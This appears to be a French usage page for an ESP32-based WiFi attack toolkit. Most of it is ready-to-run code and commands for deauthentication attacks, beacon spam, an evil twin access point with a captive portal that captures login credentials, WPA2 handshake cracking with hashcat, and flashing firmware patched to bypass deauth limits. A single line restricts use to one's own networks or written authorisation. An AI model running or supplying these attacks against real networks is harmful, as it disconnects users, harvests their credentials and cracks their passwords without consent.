Démarrage rapide

  1. Brancher l'ESP32 sur USB → /dev/ttyUSB0
  2. Activer l'environnement : source "Wifi Hacking/.venv/bin/activate"
  3. Lancer cette interface : python tools/webui.py
  4. Ouvrir http://localhost:8080 dans le navigateur

Pour accéder depuis un autre appareil du réseau : http://<IP-Kali>:8080

Scanner WiFi

Le scanner utilise l'interface STA de l'ESP32 pour détecter les réseaux à proximité.

Via cette interface

Onglet Scanner → bouton Scanner. Cliquer sur un réseau dans le tableau pour le sélectionner et pré-remplir les autres formulaires.

Via le REPL MicroPython

from lib.wifi_scanner import scan, scan_loop, select

nets = scan()                  # scan unique
scan_loop(interval=10)         # scans toutes les 10s
cible = select(nets)           # sélection interactive

Sniffer (mode promiscuous)

Nécessite le firmware custom. Capture toutes les trames 802.11 à proximité.

Packet Sniffer

from lib.packet_sniffer import sniff

sniff(duration=30)             # 30s, hopping auto sur canaux 1-13
sniff(duration=60, channel=6)  # 60s, canal 6 fixé

Probe Request Sniffer

Capture les requêtes émises par les appareils qui cherchent des réseaux connus.

from lib.probe_sniffer import sniff_probes

sniff_probes(duration=60)           # 60s, hopping
sniff_probes(duration=0, channel=1) # infini sur canal 1

Deauth Attack

Nécessite le firmware custom. Envoie des trames de désauthentification 802.11 (subtype 0xC0) pour déconnecter des clients.

from lib.wifi_scanner import scan, select
from lib.deauth import deauth_client, deauth_broadcast, deauth_loop

nets  = scan()
cible = select(nets)

# Déconnecter un client spécifique
deauth_client(cible['bssid'], 'aa:bb:cc:dd:ee:ff', count=100)

# Déconnecter tous les clients (broadcast)
deauth_broadcast(cible['bssid'], count=200)

# Continu jusqu'à Ctrl+C
deauth_loop(cible['bssid'])
Utilisation légale uniquement sur vos propres réseaux ou avec autorisation écrite.

Beacon Spam

Nécessite le firmware custom. Génère de faux points d'accès (flooding de Beacons).

from lib.beacon_spam import spam_random, spam_fr, spam_clone

spam_random(channel=6)                   # SSIDs aléatoires
spam_fr(channel=1)                       # Opérateurs FR (Orange/SFR/Free...)
spam_clone('NomDuReseau', channel=6)     # Cloner un SSID précis

Evil Twin + Portail Captif

Crée un AP factice avec portail captif pour capturer des identifiants.

from lib.wifi_scanner import scan, select
from lib.evil_twin import start, show_captured

nets  = scan()
cible = select(nets)

# Evil Twin simple
start(cible['ssid'], channel=cible['ch'])

# Avec deauth de l'AP réel en simultané
start(cible['ssid'], channel=cible['ch'], deauth_ap_mac=cible['bssid'])

# Voir les credentials capturés
show_captured()

Streaming → Kali Linux

1. Démarrer le receiver sur Kali

python3 tools/receiver.py
# Options : --port 9999 --out captures/

2. Connecter l'ESP32 et streamer

from lib.streaming import connect_ap, start

connect_ap('NomDuHotspot', 'motdepasse')
start()                           # hopping auto
start(duration=120, channel=6)    # canal fixé

3. Analyser avec Wireshark / Hashcat

wireshark captures/capture_*.pcap

# Crack WPA2 si handshake capturé
hcxpcapngtool -o hash.hc22000 captures/capture_*.pcap
hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt

Firmware Custom

Le firmware officiel MicroPython ne supporte pas l'injection ni le mode promiscuous. Le firmware custom ajoute :

  • esp.wifi_set_promiscuous(True/False)
  • esp.wifi_get_pkt()
  • esp.wifi_send_pkt_freedom(buf, seq)
# Compiler et flasher (nécessite Docker)
bash tools/build_firmware.sh

Flash manuel

# 1. Effacer la flash
python3 -m esptool --port /dev/ttyUSB0 --baud 460800 erase-flash

# 2. Flasher le firmware mergé (bootloader + app)
python3 -m esptool --port /dev/ttyUSB0 --baud 460800 \
    write-flash -z 0x1000 firmware/micropython-esp32-custom-wifi.bin

# 3. Flasher l'app patchée (bypass deauth)
python3 -m esptool --port /dev/ttyUSB0 --baud 460800 \
    write-flash -z 0x10000 firmware/micropython-app-patched.bin

# 4. Déployer les modules Python
python tools/deploy.py
